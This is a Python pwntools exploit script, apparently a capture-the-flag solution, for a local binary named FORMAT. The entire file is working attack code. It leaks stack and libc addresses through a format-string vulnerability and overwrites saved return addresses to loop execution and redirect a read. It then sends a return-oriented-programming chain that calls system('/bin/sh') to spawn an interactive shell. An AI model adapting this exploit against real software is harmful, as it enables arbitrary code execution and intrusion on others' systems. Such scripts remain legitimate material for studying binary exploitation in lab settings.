#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./FORMAT')
elf = ELF('./FORMAT')

def pr(a,addr):
	log.success(a+': '+hex(addr))
'''
def exec_fmt(pad):
	p = process("./FORMAT")
	# send 还是 sendline以程序为准
	p.send(pad)
	return p.recv()

fmt = FmtStr(exec_fmt)
offset = fmt.offset
pr('offset',offset)
'''
p.recvuntil("Enter your data:\n")
payload = "%p.%p.%p.%290$p.%291$p.%292$p.%293$p" + 'A'*8 
p.send(payload)
data = p.recv(0x70)
print(data)

libcbase = int(data[21:35],16) - 0x110031
_start = int(data[51:65],16) - 42 #hlt
buf = int(data[0:14],16)
ret = buf + 0x818
new_ret = ret - 0xd0 #0x100|0xd0
new_rbp = new_ret + 0x810
main_read_addr = _start + 0x1b3
do_system = libcbase + 0x4f43b # <system+27>    call   do_system
binsh_addr = libcbase + 0x1b3d88
prdi_ret = libcbase + 0x2164f  # pop rdi ; ret

pr('libcbase ',libcbase)
pr('main_read_addr',main_read_addr)
pr('old_ret',ret)
pr('new_ret',new_ret)
pr('_start',_start)
pr('buf',buf)

#gdb.attach(p)
#pause()

#修改old_ret为_start重新执行
payload = fmtstr_payload(8, {ret : _start}, numbwritten = 0).ljust(0x80, "\x00")
p.send(payload)

#===========================again==============================

#修改rbp让read可以写入ret地址
p.recvuntil("Enter your data:\n")
payload = fmtstr_payload(8, {new_ret-0x8 : new_rbp}, numbwritten = 0).ljust(0x80, "\x00") 
p.send(payload)

#修改ret为read,重新执行read
p.recvuntil("Enter your data:\n")
payload = fmtstr_payload(8, {new_ret : main_read_addr}, numbwritten = 0).ljust(0x80, "\x00") 
p.send(payload)

#写入ret
payload = p64(prdi_ret) + p64(binsh_addr) + p64(do_system)
p.send(payload)
p.recv()

p.interactive()


